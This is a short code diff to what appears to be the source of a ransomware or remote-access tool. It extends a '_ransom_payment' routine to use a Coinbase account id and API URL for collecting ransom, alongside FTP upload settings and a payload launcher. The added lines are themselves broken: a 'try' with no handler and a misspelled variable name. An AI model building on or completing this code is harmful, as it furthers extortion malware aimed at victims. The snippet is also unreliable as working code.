@@ -603,8 +603,10 @@ class Client():
 
 
     @staticmethod
-    @config(client_id=None, client_secret=None)
+    @config(account_id=None, client_id=None, client_secret=None)
     def _ransom_payment():
+        try:
+            url = 'https://api.coinbase.com/v2/accounts/{}/addresses'.format(str(account_id))
         return
 
 
@@ -2110,8 +2112,8 @@ def main(*args, **kwargs):
             Client._configure('_upload_ftp', hostname=ftp_host, username=ftp_user, password=ftp_passwd)
         if 'p' in kwargs:
             p = kwargs.get('p')
-            ransom_client_id, ransom_client_secret  = Client._get_config(p).splitlines()
-            Client._configure('_ransom_payment', client_id=ransom_client_id, client_secret=ransom_client_secret)
+            ransom_accont_id, ransom_client_id, ransom_client_secret  = Client._get_config(p).splitlines()
+            Client._configure('_ransom_payment', account_id=ransom_account_id, client_id=ransom_client_id, client_secret=ransom_client_secret)
     finally:
         payload = Client(**kwargs)
         payload.run() if not Client._debug else payload.run(host='127.0.0.1', port=1337)
@@ -2127,6 +2129,7 @@ if __name__ == '__main__':
   "g": "79328323225122003561",
   "j": "76650156158318301560",
   "l": "81040047328712224353",
+  "o": "80180089838536317512",
   "p": "80692935077109257793",
   "q": "80324520337976078676",
   "r": "81126388790932157784",
